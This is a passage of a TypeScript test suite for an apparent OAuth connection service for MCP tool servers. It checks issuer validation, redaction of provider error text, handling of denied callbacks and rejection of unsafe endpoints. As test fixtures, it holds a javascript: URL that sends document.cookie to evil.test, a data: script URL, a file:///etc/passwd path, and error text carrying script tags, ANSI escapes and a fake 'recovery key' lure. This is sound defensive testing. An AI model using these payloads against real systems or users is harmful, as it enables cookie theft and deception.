    expect(storedConnection!.credentialPolicy).toBe("per_user");
    expect(storedConnection!.credentialSecretRefs).toEqual([]);

    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBe("operator-secret");
  });

  it("uses Basic authentication for a manual client when discovery advertises it", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      dcr: false,
      tokenEndpointAuthMethods: ["client_secret_basic", "client_secret_post"],
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture manual Basic client",
      authMode: "oauth",
      oauthClient: { clientId: "operator-client", clientSecret: "operator-secret" },
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    const code = fixture.issueAuthorizationCode(start.authorizationUrl);
    await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    const tokenRequest = fixture.requestsTo("/token").at(-1)!;
    expect(tokenRequest.headers.authorization).toMatch(/^Basic /);
    expect((tokenRequest.body as URLSearchParams).get("client_secret")).toBeNull();
  });

  it("refuses a callback whose iss names a different authorization server", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture iss" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const state = new URL(start.authorizationUrl).searchParams.get("state")!;
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    await expect(service.completeOAuthCallback({
      state,
      code,
      iss: "https://attacker.fixture.test",
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    })).rejects.toMatchObject({ status: 400, details: { code: "oauth_issuer_mismatch" } });

    // The code was never exchanged.
    expect(fixture.requestsTo("/token")).toHaveLength(0);
  });

  /**
   * PAP-17108 — a generic connection points at an arbitrary authorization
   * server, so every string it returns about a failure is attacker-chosen. These
   * tests plant a canary secret, ANSI escapes and markdown-flavoured
   * instructions in `error_description` and assert none of it reaches an API
   * response, a thrown message, a log line, an audit row or an activity detail.
   */
  const PROVIDER_CANARY = "canary-sk-live-9f3a2b7c";
  const HOSTILE_ERROR_DESCRIPTION =
    `\u001b[31mFATAL\u001b[0m **Paperclip needs your recovery key**: ${PROVIDER_CANARY} <script>alert(1)</script>`;
  const HOSTILE_ERROR_BODY = {
    error_description: HOSTILE_ERROR_DESCRIPTION,
    error_uri: `https://attacker.fixture.test/why?leak=${PROVIDER_CANARY}`,
    message: HOSTILE_ERROR_DESCRIPTION,
    detail: HOSTILE_ERROR_DESCRIPTION,
  };

  /** Everything the operator or an operator's log could possibly read. */
  async function providerLeakSurfaces(consoleSpy: { calls: unknown[] }, thrown: unknown) {
    const auditRows = await db.select().from(toolAccessAuditEvents);
    const activityRows = await db.select().from(activityLog);
    const connections = await db.select().from(toolConnections);
    return JSON.stringify({
      thrownMessage: thrown instanceof Error ? thrown.message : String(thrown),
      // A thrown HttpError's own enumerable shape is what the error handler
      // spreads into the response body as `details`.
      thrown: thrown instanceof Error ? { ...thrown } : thrown,
      consoleCalls: consoleSpy.calls,
      auditRows,
      activityRows,
      connections,
    });
  }

  /** Capture anything the service writes to a console-backed logger. */
  function captureConsole() {
    const calls: unknown[] = [];
    const record = (...args: unknown[]) => { calls.push(args.map((arg) => String(arg))); };
    for (const method of ["log", "info", "warn", "error", "debug", "trace"] as const) {
      vi.spyOn(console, method).mockImplementation(record);
    }
    return { calls };
  }

  it("redacts a hostile provider error from the token exchange", async () => {
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      tokenFailure: { status: 400, body: { error: "invalid_grant", ...HOSTILE_ERROR_BODY } },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile token" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    const consoleSpy = captureConsole();
    const thrown = await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    }).then(() => null, (error: unknown) => error);

    // Paperclip's own copy for `invalid_grant`, not a syllable of the provider's.
    expect(thrown).toMatchObject({
      status: 502,
      message: "The authorization server rejected the authorization code or refresh token.",
      details: { code: "oauth_token_exchange_failed", providerError: "invalid_grant", status: 400 },
    });

    const surfaces = await providerLeakSurfaces(consoleSpy, thrown);
    expect(surfaces).not.toContain(PROVIDER_CANARY);
    expect(surfaces).not.toContain("recovery key");
    // JSON-escaped ANSI introducer: an escape sequence would arrive as \u001b.
    expect(surfaces).not.toContain("\\u001b");
    expect(surfaces).not.toContain("<script>");
  });

  it("normalizes an unrecognized provider error code instead of echoing it", async () => {
    const hostileCode = `not_a_real_code_${"x".repeat(200)}`;
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      tokenFailure: { status: 503, body: { error: hostileCode, ...HOSTILE_ERROR_BODY } },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture unknown code" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    const consoleSpy = captureConsole();
    const thrown = await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    }).then(() => null, (error: unknown) => error);

    // Off the allowlist, so the label collapses and the message falls back to
    // Paperclip's generic copy rather than naming the provider's code.
    expect(thrown).toMatchObject({
      status: 502,
      message: "OAuth token exchange failed",
      details: { code: "oauth_token_exchange_failed", providerError: "unrecognized", status: 503 },
    });

    const surfaces = await providerLeakSurfaces(consoleSpy, thrown);
    expect(surfaces).not.toContain("not_a_real_code");
    expect(surfaces).not.toContain(PROVIDER_CANARY);
  });

  it("redacts a hostile provider error from dynamic client registration", async () => {
    installMcpOAuthFixture({
      auth: "oauth",
      registrationFailure: { status: 400, body: { error: "invalid_redirect_uri", ...HOSTILE_ERROR_BODY } },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile dcr" });

    const consoleSpy = captureConsole();
    const thrown = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    }).then(() => null, (error: unknown) => error);

    expect(thrown).toMatchObject({
      status: 502,
      message: "The authorization server rejected Paperclip's callback URL.",
      details: {
        code: "oauth_dynamic_client_registration_failed",
        providerError: "invalid_redirect_uri",
        status: 400,
      },
    });

    const surfaces = await providerLeakSurfaces(consoleSpy, thrown);
    expect(surfaces).not.toContain(PROVIDER_CANARY);
    expect(surfaces).not.toContain("\\u001b");
  });

  /**
   * TECH-7973: an upstream token-exchange failure on the HTML callback used to
   * be opaque — only Paperclip's own copy reached the operator, so a stale
   * client secret against a `none`-only authorization server (Granola) looked
   * identical to a rejected grant. The route now writes one structured log line
   * with the allowlisted provider error, the provider's HTTP status, and the
   * non-secret auth-method/registration-source pair. Nothing else may appear.
   */
  it("logs allowlisted upstream diagnostics on the HTML callback without leaking provider text", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      dcr: false,
      tokenEndpointAuthMethods: ["none"],
      tokenFailure: {
        status: 401,
        body: {
          error: "invalid_client",
          ...HOSTILE_ERROR_BODY,
        },
      },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const app = createRouteApp(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    // A public manual client, so the diagnostic should name `none`/`manual`.
    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture diagnostics",
      authMode: "oauth",
      oauthClient: { clientId: "operator-client", publicClient: true },
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });
    const state = new URL(start.authorizationUrl).searchParams.get("state")!;
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    const warnSpy = vi.spyOn(logger, "warn").mockImplementation((() => logger) as never);
    try {
      const res = await request(app)
        .get("/api/tools/oauth/callback")
        .set("Accept", "text/html")
        .query({ state, code });
      expect(res.status).toBe(303);

      const diagnosticCalls = warnSpy.mock.calls.filter(
        ([payload]) =>
          (payload as Record<string, unknown> | undefined)?.artifact ===
          "tool_app.oauth_callback",
      );
      expect(diagnosticCalls).toHaveLength(1);
      const [, message] = diagnosticCalls[0]!;
      expect(message).toBe("OAuth callback failed upstream");
      const payload = diagnosticCalls[0]![0] as Record<string, unknown>;
      expect(payload).toMatchObject({
        code: "oauth_token_exchange_failed",
        connectionId: connected.connectionId,
        companyId: company.id,
        providerError: "invalid_client",
        upstreamStatus: 401,
        tokenEndpointAuthMethod: "none",
        clientRegistrationSource: "manual",
      });

      // The whole record — keys and values — must never carry provider-authored
      // text, the authorization code, the state, or the token endpoint URL.
      const logged = JSON.stringify(diagnosticCalls);
      expect(logged).not.toContain(PROVIDER_CANARY);
      expect(logged).not.toContain(HOSTILE_ERROR_DESCRIPTION);
      expect(logged).not.toContain("\u001b");
      expect(logged).not.toContain(code);
      expect(logged).not.toContain(state);
      expect(logged).not.toContain(ISSUER);
      // Only the keys we chose are present.
      expect(Object.keys(payload).sort()).toEqual([
        "artifact",
        "clientRegistrationSource",
        "code",
        "companyId",
        "connectionId",
        "providerError",
        "tokenEndpointAuthMethod",
        "upstreamStatus",
      ]);
    } finally {
      warnSpy.mockRestore();
    }
  });

  it("does not log the upstream diagnostic for a provider denial", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const app = createRouteApp(db);
    const actor = { actorType: "user" as const, actorId: "board-user" };

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture no diagnostic",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor,
    });
    const state = new URL(start.authorizationUrl).searchParams.get("state")!;

    const warnSpy = vi.spyOn(logger, "warn").mockImplementation((() => logger) as never);
    try {
      // A user declining is not an upstream failure; there is nothing to diagnose.
      const res = await request(app)
        .get("/api/tools/oauth/callback")
        .set("Accept", "text/html")
        .query({ state, error: "access_denied" });
      expect(res.status).toBe(303);
      expect(
        warnSpy.mock.calls.filter(
          ([payload]) =>
            (payload as Record<string, unknown> | undefined)?.artifact ===
            "tool_app.oauth_callback",
        ),
      ).toHaveLength(0);
    } finally {
      warnSpy.mockRestore();
    }
  });

  it("redacts a hostile denial from the callback route and consumes the state", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const logChunks: string[] = [];
    const logStream = new Writable({
      write(chunk, _encoding, callback) {
        logChunks.push(chunk.toString());
        callback();
      },
    });
    const requestLogger = createHttpLogger(pino({ redact: [...HTTP_LOG_REDACT_PATHS] }, logStream));
    const app = createRouteApp(db, undefined, requestLogger);
    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile denial" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const state = new URL(start.authorizationUrl).searchParams.get("state")!;

    const consoleSpy = captureConsole();
    const res = await request(app)
      .get("/api/tools/oauth/callback")
      .query({
        state,
        code: "oauth-authorization-code-canary-4d7e1f",
        error: "access_denied",
        error_description: HOSTILE_ERROR_DESCRIPTION,
        error_uri: HOSTILE_ERROR_BODY.error_uri,
      });

    expect(res.status).toBe(400);
    expect(res.body).toMatchObject({
      error: "The authorization server denied the request.",
      code: "oauth_authorization_denied",
      details: { code: "oauth_authorization_denied", providerError: "access_denied" },
    });
    expect(JSON.stringify(res.body)).not.toContain(PROVIDER_CANARY);
    expect(JSON.stringify(res.body)).not.toContain("\\u001b");

    const surfaces = await providerLeakSurfaces(consoleSpy, null);
    expect(surfaces).not.toContain(PROVIDER_CANARY);
    expect(surfaces).not.toContain("recovery key");

    const httpLog = logChunks.join("");
    expect(httpLog).not.toContain("oauth-authorization-code-canary-4d7e1f");
    expect(httpLog).not.toContain(PROVIDER_CANARY);
    expect(httpLog).not.toContain(HOSTILE_ERROR_DESCRIPTION);
    expect(httpLog).not.toContain(state);

    const logRecord = JSON.parse(httpLog.trim()) as {
      msg: string;
      req: { method: string; url: string; query?: unknown };
      reqQuery?: unknown;
    };
    expect(logRecord.msg).toBe("GET /api/tools/oauth/callback 400");
    expect(logRecord.req).toMatchObject({ method: "GET", url: "/api/tools/oauth/callback" });
    expect(logRecord.req.query).toBeUndefined();
    expect(logRecord.reqQuery).toBeUndefined();

    // A denial is terminal for the attempt, so the state cannot be replayed.
    await expect(db.select().from(toolOauthStates).where(eq(toolOauthStates.state, state))).resolves.toHaveLength(0);
  });

  it("returns browser denials to Permissions without reflecting provider-authored details", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const app = createRouteApp(db);
    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture browser denial",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const state = new URL(start.authorizationUrl).searchParams.get("state")!;

    const res = await request(app)
      .get("/api/tools/oauth/callback")
      .set("Accept", "text/html")
      .query({
        state,
        error: "access_denied",
        error_description: HOSTILE_ERROR_DESCRIPTION,
        error_uri: HOSTILE_ERROR_BODY.error_uri,
      });

    expect(res.status).toBe(303);
    const location = new URL(res.headers.location, PUBLIC_BASE_URL);
    expect(location.pathname).toBe(`/${company.issuePrefix}/apps/${connected.connectionId}/permissions`);
    expect(location.searchParams.get("oauth")).toBe("denied");
    expect(location.searchParams.get("code")).toBe("oauth_authorization_denied");
    expect(res.headers.location).not.toContain(PROVIDER_CANARY);
    expect(res.headers.location).not.toContain("error_description");
    expect(res.headers.location).not.toContain("error_uri");
  });

  it("validates the callback state before acting on a provider-reported error", async () => {
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture unsolicited denial" });

    // An unsolicited callback carries no state Paperclip issued, so it is
    // rejected on that ground and never reaches the provider-error branch.
    await expect(service.completeOAuthCallback({
      state: "state-paperclip-never-issued",
      error: "access_denied",
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    })).rejects.toMatchObject({
      status: 400,
      message: "OAuth state was not found or has already been used",
    });
  });

  /**
   * PAP-17109 — a denial or a cancel is a final answer to an authorization
   * request, so it has to end the request rather than just fail the callback.
   * Left live, the `state` the user refused stays completable for the rest of its
   * TTL by anyone who can produce a code, and the board keeps showing a prompt
   * for a flow the user already declined.
   */
  describe("denied and cancelled callbacks", () => {
    it("stops a later code from completing a flow the user refused", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const actor = { actorType: "user" as const, actorId: "board-user" };
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture denied" });
      const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
      const state = new URL(start.authorizationUrl).searchParams.get("state")!;
      // Held before the denial on purpose: this is the whole attack. A code that
      // shows up after "no" must not be exchangeable.
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);

      await expect(service.completeOAuthCallback({ state, error: "access_denied", redirectUri: REDIRECT_URI, actor }))
        .rejects.toMatchObject({ status: 400, details: { code: "oauth_authorization_denied" } });

      await expect(service.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor }))
        .rejects.toMatchObject({ status: 400, message: "OAuth state was not found or has already been used" });

      expect(fixture.requestsTo("/token")).toHaveLength(0);
      const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
      // Still a draft: nothing about the refused attempt made it a live connection.
      expect(connection).toMatchObject({ status: "draft" });
      expect(connection!.credentialSecretRefs.some((ref) => ref.configPath === "oauth.access_token")).toBe(false);
    });

    it("treats a cancel the same as a denial even when the provider names it its own way", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const actor = { actorType: "user" as const, actorId: "board-user" };
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture cancelled" });
      const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
      const state = new URL(start.authorizationUrl).searchParams.get("state")!;
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);

      // Real providers invent their own cancel codes. Whether or not Paperclip
      // recognizes the label, the request is over.
      const thrown = await service.completeOAuthCallback({
        state,
        error: "user_cancelled_authorize",
        redirectUri: REDIRECT_URI,
        actor,
      }).then(() => null, (error: unknown) => error);
      expect(thrown).toMatchObject({ status: 400, details: { code: "oauth_authorization_denied" } });
      expect((thrown as Error).message).not.toContain("user_cancelled_authorize");

      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
      await expect(service.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor }))
        .rejects.toMatchObject({ status: 400 });
      expect(fixture.requestsTo("/token")).toHaveLength(0);
    });

    it("will not let another session's denial spend a pending request", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const owner = { actorType: "user" as const, actorId: "board-user", sessionId: "owner-session" };
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture victim" });
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: owner,
      });
      const state = new URL(start.authorizationUrl).searchParams.get("state")!;

      // Same user, different browser session.
      await expect(service.completeOAuthCallback({
        state,
        error: "access_denied",
        redirectUri: REDIRECT_URI,
        actor: { ...owner, sessionId: "other-session" },
      })).rejects.toMatchObject({ status: 403 });

      // A different user — which is also how a different company arrives, since a
      // state is bound to the actor id that started it and the callback route
      // authorizes against the state row's own company.
      await expect(service.completeOAuthCallback({
        state,
        error: "access_denied",
        redirectUri: REDIRECT_URI,
        actor: { ...owner, actorId: "someone-else" },
      })).rejects.toMatchObject({ status: 403 });

      // Neither refusal cost the owner anything: the request is still live and
      // still completable.
      await expect(db.select().from(toolOauthStates).where(eq(toolOauthStates.state, state))).resolves.toHaveLength(1);
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);
      await expect(service.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor: owner }))
        .resolves.toMatchObject({ connectionId: connected.connectionId });
    });

    it("resolves the board's pending authorization prompt as rejected", async () => {
      installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const [agent] = await db.insert(agents).values({
        companyId: company.id,
        name: `Connector ${randomUUID()}`,
        role: "engineer",
        status: "idle",
        adapterType: "process",
        adapterConfig: {},
        runtimeConfig: {},
      }).returning();
      const [issue] = await db.insert(issues).values({
        companyId: company.id,
        title: "Connect the analytics app",
      }).returning();
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture prompt" });

      // The agent-driven shape: the agent asks, the board user answers in the
      // provider's window, so the prompt's fate is decided by the callback.
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "agent", actorId: agent!.id },
        subjectUserId: "board-user",
        issueId: issue!.id,
      });
      const [pending] = await db.select().from(issueThreadInteractions);
      expect(pending).toMatchObject({ kind: "request_confirmation", status: "pending" });

      await expect(service.completeOAuthCallback({
        state: new URL(start.authorizationUrl).searchParams.get("state")!,
        error: "access_denied",
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      })).rejects.toMatchObject({ status: 400, details: { code: "oauth_authorization_denied" } });

      const [resolved] = await db
        .select()
        .from(issueThreadInteractions)
        .where(eq(issueThreadInteractions.id, pending!.id));
      expect(resolved).toMatchObject({ status: "rejected", resolvedByUserId: "board-user" });
      expect(resolved!.result).toMatchObject({ outcome: "rejected" });
      expect(resolved!.resolvedAt).not.toBeNull();
      // The prompt's reason is Paperclip's own copy, never the provider's.
      expect(JSON.stringify(resolved!.result)).not.toContain("access_denied");
      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
    });

    it("lets only one of two simultaneous callbacks exchange a code", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const actor = { actorType: "user" as const, actorId: "board-user" };
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture replay" });
      const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
      const state = new URL(start.authorizationUrl).searchParams.get("state")!;
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);

      // A second database handle, because a race needs two connections: this
      // driver pipelines everything issued through one handle, which would
      // serialize the two callbacks and prove nothing. With two connections both
      // callbacks can read a live state row before either deletes it, so the
      // atomic `DELETE … RETURNING` is what picks the winner.
      const otherDb = createDb(tempDb!.connectionString);
      const otherService = toolAccessService(otherDb);
      let settled: PromiseSettledResult<unknown>[];
      try {
        // Connect before racing: paying TCP and startup latency inside the race
        // would just hand the first callback an uncontested head start.
        await otherDb.select().from(companies).limit(1);
        settled = await Promise.allSettled([
          service.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor }),
          otherService.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor }),
        ]);
      } finally {
        await otherDb.$client.end({ timeout: 5 });
      }

      expect(settled.filter((entry) => entry.status === "fulfilled")).toHaveLength(1);
      // The loser never reached the token endpoint at all.
      expect(fixture.requestsTo("/token")).toHaveLength(1);
      const rejection = settled.find((entry) => entry.status === "rejected") as PromiseRejectedResult;
      expect(rejection.reason).toMatchObject({
        status: 400,
        message: "OAuth state was not found or has already been used",
      });
    });
  });

  it("accepts an iss that differs only by a trailing slash", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture iss slash" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    await expect(service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      iss: `${ISSUER}/`,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    })).resolves.toMatchObject({ connectionId: connected.connectionId });
  });

  it("re-registers rather than reusing a client bound to a different callback", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture rebind" });
    await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(fixture.requestsTo("/register")).toHaveLength(1);

    // Same redirect URI: the stored client is still bound, so nothing re-registers.
    await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(fixture.requestsTo("/register")).toHaveLength(1);

    // Different callback origin: the binding no longer holds.
    await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://other.fixture.test/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(fixture.requestsTo("/register")).toHaveLength(2);
  });

  it("will not auto-re-register over a client the operator supplied", async () => {
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture manual rebind",
      authMode: "oauth",
      oauthClient: { clientId: "operator-client" },
    });
    await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    // The callback moved. Paperclip cannot re-register in the operator's console,
    // so it must stop and say so rather than silently minting a new client.
    await expect(service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://other.fixture.test/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    })).rejects.toMatchObject({ details: { code: "oauth_manual_client_rebinding_required" } });
  });

  /**
   * PAP-17099 — the authorization endpoint is the one discovered value Paperclip
   * hands to the operator's browser as a top-level navigation, so a hostile
   * server must not be able to advertise a scheme that runs code in the board's
   * origin, reads a local file, or downgrades the authorization request.
   */
  describe("unsafe advertised authorization endpoints", () => {
    it.each([
      ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
      ["data:", "data:text/html,<script>alert(document.domain)</script>"],
      ["file:", "file:///etc/passwd"],
      ["plaintext http", "http://evil.fixture.test/authorize"],
      ["credentials disguising the origin", "https://mcp.fixture.test@evil.fixture.test/authorize"],
      ["a fragment", "https://auth.fixture.test/authorize#@evil.fixture.test"],
      ["a malformed url", "not-a-url"],
    ])("refuses to connect when the server advertises %s", async (_label, authorizationEndpoint) => {
      installMcpOAuthFixture({ auth: "oauth", authorizationEndpoint });
      const company = await createCompany(db);
      const service = toolAccessService(db);

      await expect(service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile authorize" }))
        .rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });

      // Nothing about the refused endpoint is persisted, so a later reconnect
      // cannot pick it back up out of the connection config.
      const [connection] = await db.select().from(toolConnections);
      expect(JSON.stringify(connection?.config ?? {})).not.toContain(authorizationEndpoint);
      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
    });

    it("never navigates to a stored authorization endpoint that is unsafe", async () => {
      installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);

      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture poisoned config" });
      // A row written before the gate existed (or by any other writer) is not
      // trusted just because it is in Paperclip's own database.
      const poisonStoredAuthorizationUrl = async () => {
        const [row] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
        const poisoned = {
          ...row!.config,
          oauth: { ...(row!.config.oauth as Record<string, unknown>), authorizationUrl: "javascript:alert(1)" },
        };
        await db.update(toolConnections)
          .set({ config: poisoned, transportConfig: poisoned })
          .where(eq(toolConnections.id, connected.connectionId));
      };
      await poisonStoredAuthorizationUrl();

      // The stored value is discarded and re-discovered rather than opened.
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      });
      expect(start.authorizationUrl.startsWith(`${ISSUER}/authorize?`)).toBe(true);

      // And when re-discovery cannot supply a safe endpoint, sign-in fails
      // closed with the reason instead of falling back to the stored value.
      await db.delete(toolOauthStates);
      await poisonStoredAuthorizationUrl();
      vi.restoreAllMocks();
      vi.spyOn(globalThis, "fetch").mockResolvedValue(jsonResponse({}, 404));
      await expect(service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      })).rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });
      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
    });

    it("refuses an unsafe token endpoint even when the authorization endpoint is fine", async () => {
      installMcpOAuthFixture({ auth: "oauth", tokenEndpoint: "http://evil.fixture.test/token" });
      const company = await createCompany(db);
      const service = toolAccessService(db);

      await expect(service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile token" }))
        .rejects.toMatchObject({ status: 422, details: { code: "oauth_token_endpoint_rejected" } });
    });

    it("allows loopback http only outside an authenticated public deployment", async () => {
      installMcpOAuthFixture({ auth: "oauth", authorizationEndpoint: "http://127.0.0.1:8930/authorize" });
      const company = await createCompany(db);
      // Default deployment = local development, where a loopback authorization
      // server is how someone tests their own MCP server.
      const service = toolAccessService(db);
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture loopback authorize" });
